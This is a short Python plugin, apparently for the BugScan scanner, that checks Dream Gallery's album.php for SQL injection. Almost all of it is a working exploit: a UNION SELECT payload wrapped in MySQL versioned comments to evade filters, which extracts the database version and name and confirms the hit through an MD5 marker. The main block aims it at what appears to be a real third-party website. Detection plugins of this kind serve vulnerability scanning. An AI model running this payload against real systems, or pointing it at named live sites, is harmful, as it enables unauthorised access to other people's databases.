#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Grace
#_PlugName_ = Plugin Format
#_Function_ = 插件格式
#_FileName_ = Plugin_Format.py
#refer:https://www.bugscan.net/#!/x/2013

def assign(service, arg):
    if service =="dreamgallery":  # 1. service字符串
        return True, arg
 
def audit(arg):
    payload='dream/album.php?id=658+and+1*2*3=6+and+0+/*!12345union*/+/*!12345select*/+1,group_concat(0x53716c20496e6a656374696f6e20447265616d2047616c6c657279202d2046656c69706520416e647269616e20506569786f746f,0x3c62723e,version(),0x3a,md5(1),0x3a,database()),3,4,5,6,7,8,9,10--+'
    #2.主体攻击代码部分
    target=arg+payload
    code,head,body,errcode,final_url=curl.curl2(target)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in body:
    	security_hole(target)
 
if __name__ =='__main__':
    from dummy import*
    audit(assign('dreamgallery', 'http://clareslab.com.br/')[1])
    # 3. service字符串
    # 4.http://www.example.com/ 字符串